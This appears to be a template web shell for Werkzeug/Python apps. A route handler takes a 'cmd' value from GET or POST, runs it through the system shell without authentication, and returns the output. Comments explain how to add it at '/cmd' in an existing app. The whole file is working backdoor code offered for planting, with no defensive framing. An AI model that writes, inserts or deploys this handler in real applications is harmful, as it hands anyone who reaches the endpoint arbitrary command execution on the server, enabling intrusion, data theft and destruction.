from werkzeug.wrappers import Request, Response
import subprocess

def cmd_route(request):
    """Drop-in route handler for command execution"""
    # Handle both GET and POST
    if request.method == 'POST':
        cmd = request.form.get('cmd', '')
    else:
        cmd = request.args.get('cmd', '')
    
    if not cmd:
        cmd = '{command}'
    
    try:
        # Execute command and capture output
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout
        if result.stderr:
            output += "\nSTDERR:\n" + result.stderr
        
        return Response(output, mimetype='text/plain')
    except subprocess.TimeoutExpired:
        return Response("Command timed out", status=408)
    except Exception as e:
        return Response(f"Error: {str(e)}", status=500)

# Add this to your existing URL routing:
# Rule('/cmd', endpoint='cmd', methods=['GET', 'POST'])
# And in your dispatch method: 'cmd': cmd_route